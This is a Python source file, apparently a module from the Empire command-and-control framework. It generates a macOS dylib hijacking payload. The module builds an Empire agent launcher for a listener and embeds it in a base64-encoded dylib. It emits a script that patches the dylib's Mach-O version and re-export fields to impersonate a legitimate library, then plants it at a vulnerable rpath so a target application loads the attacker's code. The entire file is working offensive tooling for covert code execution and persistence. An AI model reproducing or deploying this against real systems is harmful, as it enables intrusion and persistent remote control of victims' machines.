import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils import module_util


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        arch = params["Arch"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
        )
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')

        dylib_bytes = main_menu.stagergenv2.generate_dylib(
            launcher_code=launcher, arch=arch, hijacker=True
        )
        module_util.ensure_python3_macho_template(
            dylib_bytes,
            "data/misc/" + main_menu.stagergenv2.dylib_template_name(arch, True),
        )
        encoded_dylib = base64.b64encode(dylib_bytes).decode()
        dylib = params["LegitimateDylibPath"]
        vrpath = params["VulnerableRPATH"]

        return f"""
import base64
import os
import tempfile

TARGET_DYLIB = {dylib!r}
VR_PATH = {vrpath!r}

def run(attackerDYLIB):

    import ctypes
    import io
    import shutil
    import struct


    LC_REQ_DYLD = 0x80000000
    LC_LOAD_WEAK_DYLIB = LC_REQ_DYLD | 0x18
    LC_RPATH = (0x1c | LC_REQ_DYLD)
    LC_REEXPORT_DYLIB = 0x1f | LC_REQ_DYLD

    (
        LC_SEGMENT, LC_SYMTAB, LC_SYMSEG, LC_THREAD, LC_UNIXTHREAD, LC_LOADFVMLIB,
        LC_IDFVMLIB, LC_IDENT, LC_FVMFILE, LC_PREPAGE, LC_DYSYMTAB, LC_LOAD_DYLIB,
        LC_ID_DYLIB, LC_LOAD_DYLINKER, LC_ID_DYLINKER, LC_PREBOUND_DYLIB,
        LC_ROUTINES, LC_SUB_FRAMEWORK, LC_SUB_UMBRELLA, LC_SUB_CLIENT,
        LC_SUB_LIBRARY, LC_TWOLEVEL_HINTS, LC_PREBIND_CKSUM
    ) = range(0x1, 0x18)

    MH_MAGIC = 0xfeedface
    MH_CIGAM = 0xcefaedfe
    MH_MAGIC_64 = 0xfeedfacf
    MH_CIGAM_64 = 0xcffaedfe

    _CPU_ARCH_ABI64  = 0x01000000

    CPU_TYPE_NAMES = {{
        -1:     'ANY',
        1:      'VAX',
        6:      'MC680x0',
        7:      'i386',
        _CPU_ARCH_ABI64  | 7:    'x86_64',
        8:      'MIPS',
        10:     'MC98000',
        11:     'HPPA',
        12:     'ARM',
        13:     'MC88000',
        14:     'SPARC',
        15:     'i860',
        16:     'Alpha',
        18:     'PowerPC',
        _CPU_ARCH_ABI64  | 18:    'PowerPC64',
    }}



    #structs that we need

    class mach_header(ctypes.Structure):

        _fields_ = [

            ("magic", ctypes.c_uint),
            ("cputype", ctypes.c_uint),
            ("cpusubtype", ctypes.c_uint),
            ("filetype", ctypes.c_uint),
            ("ncmds", ctypes.c_uint),
            ("sizeofcmds", ctypes.c_uint),
            ("flags", ctypes.c_uint)

        ]

    class mach_header_64(ctypes.Structure):
        _fields_ = mach_header._fields_ + [('reserved',ctypes.c_uint)]

    class load_command(ctypes.Structure):
        _fields_ = [
            ("cmd", ctypes.c_uint),
            ("cmdsize", ctypes.c_uint)
        ]


    LC_HEADER_SIZE = 0x8


    def checkPrereqs(attackerDYLIB, targetDYLIB):


        if not os.path.exists(attackerDYLIB):


            print('ERROR: dylib \\'%s\\' not found' % (attackerDYLIB))
            return False


        if not os.path.exists(targetDYLIB):


            print('ERROR: dylib \\'%s\\' not found' % (targetDYLIB))
            return False

        with open(attackerDYLIB, 'rb') as attacker, open(targetDYLIB, 'rb') as target:
            attackerHeader = mach_header.from_buffer_copy(attacker.read(28))
            targetHeader = mach_header.from_buffer_copy(target.read(28))

        if attackerHeader.cputype != targetHeader.cputype:
            print('ERROR: Architecture mismatch')
            return False

        return True


    def findLoadCommand(fileHandle, targetLoadCommand):


        MACHHEADERSZ64 = 32
        MACHHEADERSZ = 28
        matchedOffsets = []
        #wrap
        try:
            header = mach_header.from_buffer_copy(fileHandle.read(MACHHEADERSZ))
            if header.magic == MH_MAGIC_64:
                fileHandle.seek(0, io.SEEK_SET)
                header = mach_header_64.from_buffer_copy(fileHandle.read(MACHHEADERSZ64))
            ncmds = header.ncmds

            # Get to the load commands
            current = fileHandle.tell() #save offset to load command

            for cmd in range(ncmds):

                offset = current
                lc = load_command.from_buffer_copy(fileHandle.read(LC_HEADER_SIZE))
                size = lc.cmdsize
                if lc.cmd == targetLoadCommand:

                    matchedOffsets.append(offset)

                fileHandle.seek(size - LC_HEADER_SIZE, io.SEEK_CUR)
                current = fileHandle.tell()

        #exceptions
        except Exception as e:

            #err msg
            print('EXCEPTION (finding load commands): %s: %s' % (type(e).__name__, e))

            #reset
            matchedOffsets = None

        return matchedOffsets

    #configure version info
    #  1) find/extract version info from target .dylib
    #  2) find/update version info from hijacker .dylib to match target .dylib
    def configureVersions(attackerDYLIB, targetDYLIB):

        #wrap
        try:

            #dbg msg
            print(' [+] parsing \\'%s\\' to extract version info' % (os.path.split(targetDYLIB)[1]))

            #open target .dylib
            fileHandle = open(targetDYLIB, 'rb')

            #find LC_ID_DYLIB load command
            # ->and check
            versionOffsets = findLoadCommand(fileHandle, LC_ID_DYLIB)
            if not versionOffsets or not len(versionOffsets):

                #err msg
                print('ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %s' % (os.path.split(targetDYLIB)[1]))

                #bail
                return False

            #dbg msg
            print('     found \\'LC_ID_DYLIB\\' load command at offset(s): %s' % (versionOffsets))

            #seek to offset of LC_ID_DYLIB
            fileHandle.seek(versionOffsets[0], io.SEEK_SET)

            #seek to skip over LC header and timestamp
            fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

            '''
            struct dylib {{ union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; }};
            '''

            #extract current version
            currentVersion = fileHandle.read(4)

            #extract compatibility version
            compatibilityVersion = fileHandle.read(4)

            #dbg msg(s)
            print('     extracted current version: 0x%x' % (struct.unpack('<L', currentVersion)[0]))
            print('     extracted compatibility version: 0x%x' % (struct.unpack('<L', compatibilityVersion)[0]))

            #close
            fileHandle.close()

            #dbg msg
            print(' [+] parsing \\'%s\\' to find version info' % (os.path.split(attackerDYLIB)[1]))

            #open target .dylib
            fileHandle = open(attackerDYLIB, 'rb+')

            #find LC_ID_DYLIB load command
            # ->and check
            versionOffsets = findLoadCommand(fileHandle, LC_ID_DYLIB)
            if not versionOffsets or not len(versionOffsets):

                #err msg
                print('ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %s' % (os.path.split(attackerDYLIB)[1]))

                #bail
                return False

            #dbg msg(s)
            print('     found \\'LC_ID_DYLIB\\' load command at offset(s): %s' % (versionOffsets))
            print(' [+] updating version info in %s to match %s' % ((os.path.split(attackerDYLIB)[1]), (os.path.split(targetDYLIB)[1])))

            #update version info
            for versionOffset in versionOffsets:

                #seek to offset of LC_ID_DYLIB
                fileHandle.seek(versionOffset, io.SEEK_SET)

                #seek to skip over LC header and timestamp
                fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

                #dbg msg
                print('setting version info at offset %s' % (versionOffset))

                #set current version
                fileHandle.write(currentVersion)

                #set compatability version
                fileHandle.write(compatibilityVersion)

            #close
            fileHandle.close()

        except Exception as e:

            #err msg
            print('EXCEPTION (configuring version info): %s: %s' % (type(e).__name__, e))
            return False

        return True

    #configure re-export
    # ->update hijacker .dylib to re-export everything to target .dylib
    def configureReExport(attackerDYLIB, targetDYLIB):

        #wrap
        try:

            #dbg msg
            print(' [+] parsing \\'%s\\' to extract faux re-export info' % (os.path.split(attackerDYLIB)[1]))

            #open attacker's .dylib
            fileHandle = open(attackerDYLIB, 'rb+')

            #find LC_REEXPORT_DYLIB load command
            # ->and check
            reExportOffsets = findLoadCommand(fileHandle, LC_REEXPORT_DYLIB)
            if not reExportOffsets or not len(reExportOffsets):

                #err msg
                print('ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %s' % (os.path.split(attackerDYLIB)[1]))

                #bail
                return False

            #dbg msg
            print('     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %s' % (reExportOffsets))

            '''
            struct dylib {{ union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; }};
            '''

            #update re-export info
            #TODO: does the current and compat version need to match? we can easily set it
            for reExportOffset in reExportOffsets:

                #seek to offset of LC_REEXPORT_DYLIB
                fileHandle.seek(reExportOffset, io.SEEK_SET)

                #seek to skip over command
                fileHandle.seek(0x4, io.SEEK_CUR)

                #read in size of load command
                commandSize = struct.unpack('<L', fileHandle.read(4))[0]

                #dbg msg
                print('     extracted LC command size: 0x%x' % (commandSize))

                #read in path offset
                pathOffset = struct.unpack('<L', fileHandle.read(4))[0]

                #dbg msg
                print('     extracted path offset: 0x%x' % (pathOffset))

                #seek to path offset
                fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)

                #calc length of path
                # it makes up rest of load command data
                pathSize = commandSize - (fileHandle.tell() - reExportOffset)

                #dbg msg
                print('     computed path size: 0x%x' % (pathSize))

                #write out path, NUL padded; it must leave room for a terminator
                targetBytes = targetDYLIB.encode()
                if len(targetBytes) >= pathSize:
                    print('ERROR: target path too long for re-export slot (%d >= %d bytes)' % (len(targetBytes), pathSize))
                    fileHandle.close()
                    return False
                fileHandle.write(targetBytes + b'\\0' * (pathSize - len(targetBytes)))

                #dbg msg
                print(' [+] updated embedded re-export')

            #close
            fileHandle.close()

        #handle exceptions
        except Exception as e:

            #err msg
            print('EXCEPTION (configuring re-exports): %s: %s' % (type(e).__name__, e))

            #bail
            return False

        return True

    def configure(attackerDYLIB, targetDYLIB):

        #configure version info
        # ->update attacker's .dylib to match target .dylib's version info
        if not configureVersions(attackerDYLIB, targetDYLIB):

            #err msg
            print('ERROR: failed to configure version info')

            #bail
            return False

        #configure re-export
        # ->update attacker's .dylib to re-export everything to target .dylib
        if not configureReExport(attackerDYLIB, targetDYLIB):

            #err msg
            print('ERROR: failed to configure re-export')

            #bail
            return False

        return True


    targetDYLIB = TARGET_DYLIB
    vrpath = VR_PATH

    print(' [+] configuring %s to hijack %s' % (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1]))

    if not checkPrereqs(attackerDYLIB, targetDYLIB):
        print('ERROR: prerequisite check failed\\n')
        return False

    if not configure(attackerDYLIB, targetDYLIB):
        print('ERROR: failed to configure %s\\n' % (os.path.split(targetDYLIB)[1]))
        return False

    if not os.path.dirname(vrpath) or os.path.isdir(vrpath):
        print('ERROR: VulnerableRPATH must be a full file path, got %s' % (vrpath))
        return False
    os.makedirs(os.path.dirname(vrpath), exist_ok=True)
    shutil.copy2(attackerDYLIB, vrpath)
    os.chmod(vrpath, 0o755)
    print('\\nHijacker configured and copied to %s' % (vrpath))
    return True

fd, attackerPath = tempfile.mkstemp(suffix='.dylib')
with os.fdopen(fd, 'wb') as temp:
    temp.write(base64.b64decode("{encoded_dylib}"))
try:
    ok = run(attackerPath)
finally:
    os.remove(attackerPath)
if not ok:
    print('[!] CreateHijacker FAILED: nothing planted at %s' % (VR_PATH))
    raise RuntimeError('CreateHijacker failed; see output above')
"""
